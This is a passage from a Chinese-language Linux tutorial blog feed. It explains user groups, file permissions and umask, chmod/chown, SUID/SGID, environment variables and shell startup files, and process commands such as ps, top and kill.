这并不是说这些组没有成员。当一个用户在/etc/passwd文件中指定某个组作为默认组时， 那么这个用户的账户不会作为该组成员再出现在/etc/group文件中</p></blockquote></li></ul></li></ul><p>切记不要直接修改 group 文件来将用户添加到一个组，要使用 <code>usermod</code> 命令。</p><h2 id="创建修改组"><a class="markdownIt-Anchor" href="#创建修改组"></a> 创建修改组</h2><p><code>groupadd</code> 命令可在系统上创建新组，新的组默认没有用户，可以使用 <code>usermod</code> 命令将用户加入新的组，<code>-G</code> 参数表示把这个新组添加到该用户的组列表里，使用 <code>-g</code> 则会覆盖用户原有的组。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo groupadd shared</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tail -1 /etc/group</span></span><br><span class="line">shared:x:1001:</span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo usermod -G shared virgil</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tail -1 /etc/group</span></span><br><span class="line">shared:x:1001:virgil</span><br></pre></td></tr></table></figure><p><code>groupmod</code> 命令可以修改已有组的 GID（加 <code>-g</code> 选项）或组名（加 <code>-n</code> 选项）。</p><h1 id="文件权限"><a class="markdownIt-Anchor" href="#文件权限"></a> 文件权限</h1><h2 id="文件权限符"><a class="markdownIt-Anchor" href="#文件权限符"></a> 文件权限符</h2><p>当使用 <code>ls -l</code> 命令时我们会有如下输出：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ls -l</span></span><br><span class="line">total 62080</span><br><span class="line">drwxr-xr-x   3 virgil virgil     4096 May 13 22:11 c</span><br><span class="line">drwxr-xr-x   3 virgil virgil     4096 Oct 18 18:48 cf-project</span><br><span class="line">-rw-r--r--   1 virgil virgil 63476994 Jul 23 11:08 cide.deb</span><br></pre></td></tr></table></figure><p>输出结果的第一个字段就是描述文件和目录权限的编码：</p><ul><li>第一个字段表示了对象的类型：<ul><li><code>-</code> 代表文件</li><li><code>d</code> 代表目录</li><li><code>l</code> 代表链接</li><li><code>c</code> 代表字符型设备</li><li><code>b</code> 代表块设备</li><li><code>n</code> 代表网络设备</li></ul></li><li>之后有3组三字符的编码。这三组分别代表：<ul><li>对象的属主的权限</li><li>对象的属组的权限</li><li>其他用户的权限</li></ul></li><li>每一组中的每个字符分别代表<ul><li><code>r</code> 代表可读</li><li><code>w</code> 代表可写</li><li><code>x</code> 代表可执行</li><li>如果对应位置是 <code>-</code>，那么代表没有此权限</li></ul></li></ul><h2 id="默认文件权限"><a class="markdownIt-Anchor" href="#默认文件权限"></a> 默认文件权限</h2><p><code>umask</code> 命令用来创建文件和目录的默认权限：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> rm new file</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> touch newfile</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ls -al newfile</span> </span><br><span class="line">-rw-r--r-- 1 virgil virgil 0 Nov  8 17:23 newfile</span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">umask</span></span></span><br><span class="line">0022</span><br></pre></td></tr></table></figure><p><code>umask</code> 的第一位代表黏着位，这个我们后面再说。后面三位代表的则是文件权限的&quot;遮罩&quot;,首先我们了解一下我们是如何使用八进制表示文件权限的。</p><p>对于一个文件的一组 <code>rwx</code> 属性，我们一共有8种可能（2^3)，例如 <code>-wx -&gt; 011 -&gt; 3</code>。对于默认的 <code>umask</code> <code>0022</code> 这个值来说，第一位是黏着位我们不看，对于后三位：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">666 -&gt; 110 110 110 -&gt; rw-rw-rw- 全部权限</span><br><span class="line">       --- --- --- 减去</span><br><span class="line">022 -&gt; 000 010 010 -&gt; 遮罩</span><br><span class="line">       === === ===</span><br><span class="line">644 -&gt; 110 100 100 -&gt; rw-r--r-- 默认权限</span><br></pre></td></tr></table></figure><h1 id="改变安全性设置"><a class="markdownIt-Anchor" href="#改变安全性设置"></a> 改变安全性设置</h1><h2 id="更改权限"><a class="markdownIt-Anchor" href="#更改权限"></a> 更改权限</h2><p><code>chmod</code> 命令用来改变文件和目录的安全性设置。默认格式是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod [OPTION]... MODE[,MODE]... FILE...</span><br><span class="line">chmod [OPTION]... OCTAL-MODE FILE...</span><br></pre></td></tr></table></figure><p>其中， octal-mode 代表的是三位的八进制代码，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ls -l test.txt</span><br><span class="line">-rw-r--r-- 1 virgil virgil 48 Nov  4 20:46 test.txt</span><br><span class="line">$ chmod 666 test.txt</span><br><span class="line">$ ls -l test.txt </span><br><span class="line">-rw-rw-rw- 1 virgil virgil 48 Nov  4 20:46 test.txt</span><br></pre></td></tr></table></figure><p>另外你也可以使用符号模式来进行快速的操作，这样就不需要去记住八进制代码了，在符号模式中：</p><ul><li>u 代表所属用户</li><li>g 代表所属组</li><li>o 代表其他用户</li><li>a 代表全部</li></ul><p>在想要操作的权限作用对象后，更上 <code>+|-|=</code> 来代表要增加，移除或者赋值。后面再更上 <code>r|w|x</code> 代表想要赋予，删除，复制的权限。例如如果想要去掉组对于文件的修改权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ls -l test.txt</span><br><span class="line">-rw-rw-rw- 1 virgil virgil 48 Nov  4 20:46 test.txt</span><br><span class="line">$ chmod g-w test.txt</span><br><span class="line">$ ls -l test.txt</span><br><span class="line">-rw-r--rw- 1 virgil virgil 48 Nov  4 20:46 test.txt</span><br></pre></td></tr></table></figure><h2 id="更改所属关系"><a class="markdownIt-Anchor" href="#更改所属关系"></a> 更改所属关系</h2><p><code>chown</code> 和 <code>chgrp</code> 命令可以用于更改文件的属组和属主。例如我们创建一个只有所属者可读可写的文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ls -l test.txt </span><br><span class="line">-rw------- 1 virgil virgil 48 Nov  4 20:46 test.txt</span><br></pre></td></tr></table></figure><p>然后使用 <code>sudo</code> 将其所属者更改为 <code>root</code>，再尝试查看文件:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo chown root test.txt </span><br><span class="line">$ cat test.txt </span><br><span class="line">cat: test.txt: Permission denied</span><br></pre></td></tr></table></figure><blockquote><p>只有root用户能够改变文件的属主。任何属主都可以改变文件的属组，但前提是属主必须 是原属组和目标属组的成员。</p></blockquote><h1 id="共享文件"><a class="markdownIt-Anchor" href="#共享文件"></a> 共享文件</h1><p>创建新文件时，Linux会用你默认的UID和GID给文件分配权限， 如果想要在大范围内共享文件，那么每次都使用 <code>chmod</code> 或者 <code>chgrp</code> 就会很麻烦， 为了解决此问题，Linux还为每个文件和目录存储了3个额外的信息位。</p><h2 id="设置用户idsuid"><a class="markdownIt-Anchor" href="#设置用户idsuid"></a> 设置用户ID（SUID）</h2><p>当文件被用户使用时，程序会以文件属主的权限运行。SUID 一般只对二进制文件有效，当执行该二进制文件时，执行者会在程序执行过程中短暂获取文件所有者的权限。例如 <code>passwd</code> 命令:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ls -l /usr/bin/passwd</span></span><br><span class="line">-rwsr-xr-x 1 root root 59640 Mar 22  2019 /usr/bin/passwd</span><br></pre></td></tr></table></figure><p>在其所有者（root）的执行权限上是 <code>s</code> 而不是 <code>x</code>，这就代表这个文件有 SUID。我们知道所有用户的密码都是储存在 <code>/etc/shadow</code> 这个文件里的，只有root用户才有修改和读取的权限。但是当我们执行 <code>passwd</code> 时，因为SUID，我们短暂获取了 <code>root</code> 用户的的权限，可以对 <code>/etc/shadow</code> 进行修改。</p><h2 id="设置组idsgid"><a class="markdownIt-Anchor" href="#设置组idsgid"></a> 设置组ID（SGID）</h2><p>与SUID一样，对二进制文件来说，执行过程中会短暂获得文件属组的权限。不同的是，对目录来说，目录中创建的新文件会以目录的默认属组作为默认属组。在共享文件时，通过设置共享目录的SGID，所有新创建文件的默认组都会是目录的数组，避免了手动更改属组的麻烦。</p><p>现在我们创建一个 <code>shared</code> 组，并创建一个共享文件夹 <code>share</code>，将文件夹的默认组更改为 <code>shared</code>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mkdir share</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> chgrp shared share/</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ls -l | grep share</span></span><br><span class="line">drwxr-xr-x   2 virgil shared     4096 Nov 15 17:22 share</span><br></pre></td></tr></table></figure><p>现在我们设置SGID，SGID可以通过 <code>chmod</code> 命令的八进制代码模式设置，其中：</p><ul><li><code>1</code> 代表黏着位</li><li><code>2</code> 代表SGID</li><li><code>4</code> 代表SUID</li><li>多种组合只需要相加，例如同时设置SGID和SUID为 <code>6</code></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mkdir share</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> chgrp shared share/</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ls -l | grep share</span></span><br><span class="line">drwxr-xr-x   2 virgil shared     4096 Nov 15 17:22 share</span><br><span class="line"><span class="meta">$</span><span class="bash"> chmod 2755 share</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ls -l | grep share</span></span><br><span class="line">drwxr-sr-x   2 virgil shared     4096 Nov 15 17:22 share</span><br></pre></td></tr></table></figure><p>此时如果我们进入此目录创建一个新的文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> share/</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ls</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> touch test.txt</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ls -l</span></span><br><span class="line">total 0</span><br><span class="line">-rw-r--r-- 1 virgil shared 0 Nov 15 17:34 test.txt</span><br></pre></td></tr></table></figure><p>可以看到文件的默认组就为shared，现在默认创建的文件对于属组来说还没有写入权限，和 Other 相同，我们可以通过修改 <code>umask</code> 来修改创建的文件的默认权限：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">umask</span> 002</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> touch test2.txt</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ls -l</span></span><br><span class="line">total 0</span><br><span class="line">-rw-r--r-- 1 virgil shared 0 Nov 15 17:34 test.txt</span><br><span class="line">-rw-rw-r-- 1 virgil shared 0 Nov 15 17:36 test2.txt</span><br></pre></td></tr></table></figure><p>这样我们就实现了文件在组内的共享。</p><h2 id="粘着位"><a class="markdownIt-Anchor" href="#粘着位"></a> 粘着位</h2><p>进程结束后文件还驻留（粘着）在内存中。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;linux-安全性&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#linux-安全性&quot;&gt;&lt;/a&gt; Linux 安全性&lt;/h1&gt;
&lt;p&gt;Linux安全系统的核心是用户账户，用户权限是通过创建用户时分配的用户ID（UID）来跟踪的。&lt;/p&gt;</summary>
      
    
    
    
    <category term="Linux" scheme="https://virgilchen97.github.io/categories/Linux/"/>
    
    
    <category term="Shell" scheme="https://virgilchen97.github.io/tags/Shell/"/>
    
  </entry>
  
  <entry>
    <title>Linux环境变量</title>
    <link href="https://virgilchen97.github.io/2020/11/Linux%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/"/>
    <id>https://virgilchen97.github.io/2020/11/Linux%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/</id>
    <published>2020-11-07T13:28:48.000Z</published>
    <updated>2022-01-26T13:48:43.537Z</updated>
    
    <content type="html"><![CDATA[<h1 id="使用linux环境变量"><a class="markdownIt-Anchor" href="#使用linux环境变量"></a> 使用Linux环境变量</h1><h2 id="全局环境变量"><a class="markdownIt-Anchor" href="#全局环境变量"></a> 全局环境变量</h2><p>可以使用 <code>printenv</code> 命令查看所有的环境变量，也可以在后面加上环境变量得名称，获取具体的环境变量的值：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> printenv HOME</span></span><br><span class="line">/home/virgil</span><br></pre></td></tr></table></figure><p>全局环境变量可以作用于所有子shell：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> printenv HOME</span></span><br><span class="line">/home/virgil</span><br><span class="line"><span class="meta">$</span><span class="bash"> bash</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> printenv HOME</span></span><br><span class="line">/home/virgil</span><br></pre></td></tr></table></figure><h2 id="局部环境变量"><a class="markdownIt-Anchor" href="#局部环境变量"></a> 局部环境变量</h2><p>在Linux系统并没有一个只显示局部环境变量的命令。<code>set</code> 命令会显示为某个特定进程设置的所有环境变量，包括局部变量、全局变量以及用户定义变量。</p><h3 id="设置一个局部变量"><a class="markdownIt-Anchor" href="#设置一个局部变量"></a> 设置一个局部变量</h3><p>我们只要简单的使用一个 <code>=</code> 就可以设置一个环境变量，注意转义空格。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> my_var=123</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="variable">$my_var</span></span> </span><br><span class="line">123</span><br></pre></td></tr></table></figure><p>由于这是一个局部变量，因此当我们进入一个子shell以后，这个变量就变得不可见了：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> my_var=123</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="variable">$my_var</span></span> </span><br><span class="line">123</span><br><span class="line"><span class="meta">$</span><span class="bash"> bash</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="variable">$my_var</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="设置一个全局环境变量"><a class="markdownIt-Anchor" href="#设置一个全局环境变量"></a> 设置一个全局环境变量</h3><p>创建全局环境变量的方法是先创建一个局部环境变量，然后使用 <code>export</code> 把它导出到全局环境中。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> my_var=123</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">export</span> my_var</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="variable">$my_var</span></span> </span><br><span class="line">123</span><br><span class="line"><span class="meta">$</span><span class="bash"> bash</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="variable">$my_var</span></span> </span><br><span class="line">123</span><br></pre></td></tr></table></figure><p>可以看到在进入了子shell后，我们定义的环境变量仍然可以被访问到。但是如果在子shell中对全局变量进行修改，那么这样的修改就只在子shell中有效</p><h3 id="删除环境变量"><a class="markdownIt-Anchor" href="#删除环境变量"></a> 删除环境变量</h3><p><code>unset</code> 命令可以用于删除环境变量，但是对于一个全局变量来说，在子shell中删除只对子shell有效，在父进程中该环境变量依然可见：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="variable">$my_var</span></span> </span><br><span class="line">123</span><br><span class="line"><span class="meta">$</span><span class="bash"> bash</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="variable">$my_var</span></span> </span><br><span class="line">123</span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">unset</span> my_var</span> </span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="variable">$my_var</span></span> </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">exit</span></span></span><br><span class="line">exit</span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="variable">$my_var</span></span> </span><br><span class="line">123</span><br><span class="line"><span class="meta">$</span><span class="bash"> </span></span><br></pre></td></tr></table></figure><h2 id="path-环境变量"><a class="markdownIt-Anchor" href="#path-环境变量"></a> Path 环境变量</h2><p>当你在shell命令行界面中输入一个外部命令时，shell必须搜索系统来找到对应的程序。PATH环境变量定义了用于进行命令和程序查找的目录。如果命令或者程序的位置没有包括在PATH变量中，那么如果不使用绝对路径的话，shell是没法找到的。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo $PATH</span><br><span class="line">/home/virgil/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:</span><br></pre></td></tr></table></figure><p>Path的各个目录之间使用 <code>:</code> 分割，想要添加一个新的路径，我们只需要引用原有的 <code>PATH</code> 的值，在连接上新的路径就可以了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ PATH=$PATH:/usr/bin</span><br></pre></td></tr></table></figure><p>注意这样修改的PATH只能维持到退出或重启系统，永久修改的方法接下来回提到。</p><h2 id="系统环境变量"><a class="markdownIt-Anchor" href="#系统环境变量"></a> 系统环境变量</h2><p>在登入Linux系统启动一个bash shell时，默认情况下bash会在几个文件中查找命令。这些文件叫作<strong>启动文件</strong>或<strong>环境文件</strong>。bash检查的启动文件取决于你启动bash shell的方式。启动bash shell有3种方式：</p><ul><li>登录时作为默认登录shell</li><li>作为非登录shell的交互式shell</li><li>作为运行脚本的非交互shell</li></ul><p>下面我们介绍bash shell在不同的方式下启动文件。</p><h3 id="登录-shell"><a class="markdownIt-Anchor" href="#登录-shell"></a> 登录 Shell</h3><p>登录 Shell 会从五个文件中读取命令：</p><ul><li><code>/etc/profile</code></li><li><code>$HOME/.bash_profile</code></li><li><code>$HOME/.bashrc</code></li><li><code>$HOME/.bash_login</code></li><li><code>$HOME/.profile</code></li></ul><p><code>/etc/profile</code> 是系统默认的Shell启动文件，所有用户登录时都会执行。在这个文件中，一般都会有一个for语句来迭代所有 <code>/etc/profile.d</code> 目录下的文件，这些文件可以是特定应用的启动文件，</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ls -l /etc/profile.d</span></span><br><span class="line">total 28</span><br><span class="line">-rw-r--r-- 1 root root   96 Aug 19  2018 01-locale-fix.sh</span><br><span class="line">-rw-r--r-- 1 root root 1557 Dec  4  2017 Z97-byobu.sh</span><br><span class="line">-rwxr-xr-x 1 root root 3417 Mar 11  2019 Z99-cloud-locale-test.sh </span><br><span class="line">-rwxr-xr-x 1 root root  873 Mar 11  2019 Z99-cloudinit-warnings.sh</span><br><span class="line">-rw-r--r-- 1 root root  833 Oct  8 02:30 apps-bin-path.sh</span><br><span class="line">-rw-r--r-- 1 root root  664 Apr  1  2018 bash_completion.sh</span><br><span class="line">-rw-r--r-- 1 root root 1003 Dec 29  2015 cedilla-portuguese.sh</span><br><span class="line">lrwxrwxrwx 1 root root   34 Dec 11  2019 wsl-integration.sh -&gt; /usr/share/wslu/wsl-integration.sh</span><br></pre></td></tr></table></figure><p><code>$HOME</code> 目录下的启动文件则是用户专属的启动文件，可以用来定义用户的环境变量，shell会按照按照下列顺序，运行第一个被找到的文件，余下的则被忽略：</p><ul><li>$HOME/.bash_profile</li><li>$HOME/.bash_login</li><li>$HOME/.profile</li></ul><h3 id="交互式shell进程"><a class="markdownIt-Anchor" href="#交互式shell进程"></a> 交互式shell进程</h3><p>如果bash是作为交互式shell启动的，它就不会访问/etc/profile文件，只会检查用户HOME目录中的 <code>.bashrc</code> 文件。如果想要持久化你定义的环境变量，那么可以将他们放到你的HOME目录中的 <code>.bashrc</code> 文件中。</p><h3 id="非交互shell"><a class="markdownIt-Anchor" href="#非交互shell"></a> 非交互shell</h3><p>系统执行shell脚本时用的就是这种shell。非交互shell是没有命令行提示符的。在启动非交互shell时想要执行一些命令的话（就像 <code>.bashrc</code>）那么可以设置 <code>BASH_ENV</code> 环境变量。</p><p>如果未设置 <code>BASH_ENV</code>，那么非交互Shell可以从启动它的父shell那里获得环境变量（仅限于全局）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;使用linux环境变量&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#使用linux环境变量&quot;&gt;&lt;/a&gt; 使用Linux环境变量&lt;/h1&gt;
&lt;h2 id=&quot;全局环境变量&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; hre</summary>
      
    
    
    
    <category term="Linux" scheme="https://virgilchen97.github.io/categories/Linux/"/>
    
    
    <category term="Shell" scheme="https://virgilchen97.github.io/tags/Shell/"/>
    
  </entry>
  
  <entry>
    <title>Linux 常用命令</title>
    <link href="https://virgilchen97.github.io/2020/11/Linux%E5%91%BD%E4%BB%A4%E8%A1%8C/"/>
    <id>https://virgilchen97.github.io/2020/11/Linux%E5%91%BD%E4%BB%A4%E8%A1%8C/</id>
    <published>2020-11-04T09:21:40.000Z</published>
    <updated>2022-01-26T13:48:43.537Z</updated>
    
    <content type="html"><![CDATA[<h1 id="常用-bash-shell-命令"><a class="markdownIt-Anchor" href="#常用-bash-shell-命令"></a> 常用 Bash Shell 命令</h1><h2 id="监测程序"><a class="markdownIt-Anchor" href="#监测程序"></a> 监测程序</h2><h3 id="查看进程"><a class="markdownIt-Anchor" href="#查看进程"></a> 查看进程</h3><p><code>ps</code> 命令输出运行在系统上的所有程序的许多信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ps</span></span><br><span class="line">  PID TTY          TIME CMD</span><br><span class="line">  775 pts/1    00:00:00 bash</span><br><span class="line">  912 pts/1    00:00:00 bash</span><br><span class="line">  920 pts/1    00:00:00 ps</span><br></pre></td></tr></table></figure><p><code>ps -ef</code> 显示所有进程，显示完整格式输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ ps -ef</span><br><span class="line">UID        PID  PPID  C STIME TTY          TIME CMD</span><br><span class="line">root         1     0  0 17:19 ?        00:00:00 /init</span><br><span class="line">root         7     1  0 17:19 ?        00:00:00 /init</span><br><span class="line">root         8     7  0 17:19 ?        00:00:00 /init</span><br><span class="line">virgil       9     8  0 17:19 pts/0    00:00:00 -zsh</span><br><span class="line">root       773     1  0 17:23 ?        00:00:00 /init</span><br><span class="line">root       774   773  0 17:23 ?        00:00:00 /init</span><br><span class="line">virgil     775   774  0 17:23 pts/1    00:00:00 /bin/bash --login</span><br><span class="line">virgil     912   775  0 17:24 pts/1    00:00:00 bash</span><br><span class="line">virgil    1362   912  0 17:36 pts/1    00:00:00 ps -ef</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>含义</th></tr></thead><tbody><tr><td>UID</td><td>启动进程的用户</td></tr><tr><td>PID</td><td>进程号</td></tr><tr><td>PPID</td><td>父进程进程号</td></tr><tr><td>C</td><td>生命周期中CPU利用率</td></tr><tr><td>STIME</td><td>进程启动时的系统时间</td></tr><tr><td>TTY</td><td>进程启动时的终端设备</td></tr><tr><td>TIME</td><td>进程累计的CPU时间</td></tr><tr><td>CMD</td><td>程序名称</td></tr></tbody></table><h3 id="时实查看进程"><a class="markdownIt-Anchor" href="#时实查看进程"></a> 时实查看进程</h3><p><code>top</code> 命令会显示时实更新的进程信息</p><p><img src="img/(2020-11-04)Linux%E5%91%BD%E4%BB%A4%E8%A1%8C.md/2020-11-04-17-49-45.png" alt="" /></p><p>load average: 系统最近1分钟，5分钟，15分钟的平均负载</p><table><thead><tr><th>参数</th><th>含义</th></tr></thead><tbody><tr><td>PID</td><td>进程号</td></tr><tr><td>USER</td><td>所属用户</td></tr><tr><td>PR</td><td>优先级</td></tr><tr><td>NI</td><td>谦让度</td></tr><tr><td>VIRT</td><td>虚拟内存消耗</td></tr><tr><td>RES</td><td>物理内存消耗</td></tr><tr><td>SHR</td><td>共享内存大小</td></tr><tr><td>S</td><td>进程状态</td></tr><tr><td>%CPU</td><td>进程使用的CPU时间比例</td></tr><tr><td>%MEM</td><td>进程使用的内存占可用内存的比例</td></tr><tr><td>Time+</td><td>自进程启动到目前为止的CPU时间总量</td></tr><tr><td>COMMAND</td><td>启动的程序名</td></tr></tbody></table><p>开启 <code>top</code> 后可以按 <code>h</code> 来获取交互命令的帮助。</p><h3 id="结束进程"><a class="markdownIt-Anchor" href="#结束进程"></a> 结束进程</h3><p><code>kill</code> 命令可以通过发送 TERM 信号给进程来结束进程，没有任何输出。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ kill 9</span><br><span class="line">$</span><br></pre></td></tr></table></figure><p>想要发送信号，你必须是进程所有者或者root。可以通过 <code>-s</code> 或者 <code>-&lt;signal&gt;</code>参数指定其他的信号</p><table><thead><tr><th>信号</th><th>名称</th><th>含义</th></tr></thead><tbody><tr><td>1</td><td>HUP</td><td>挂起</td></tr><tr><td>2</td><td>INT</td><td>中断</td></tr><tr><td>9</td><td>KILL</td><td>无条件终止</td></tr><tr><td>11</td><td>SEGV</td><td>段错误</td></tr><tr><td>15</td><td>TERM</td><td>尽可能终止</td></tr><tr><td>17</td><td>STOP</td><td>无条件停止运行，但不终止</td></tr><tr><td>18</td><td>TSTP</td><td>停止或暂停，但继续在后台运行</td></tr><tr><td>19</td><td>CONT</td><td>在STOP或TSTP之后恢复执行</td></tr></tbody></table><p>所以我们常见的杀死进程的命令 <code>kill -9 &lt;pid&gt;</code> 的含义就是发送KILL信号给对应进程。</p><p><code>killall</code> 命令更加强大，支持通过进程名来终止进程，可以使用通配符</p><h2 id="磁盘空间"><a class="markdownIt-Anchor" href="#磁盘空间"></a> 磁盘空间</h2><h3 id="挂载卸载"><a class="markdownIt-Anchor" href="#挂载卸载"></a> 挂载卸载</h3><p><code>mount</code> 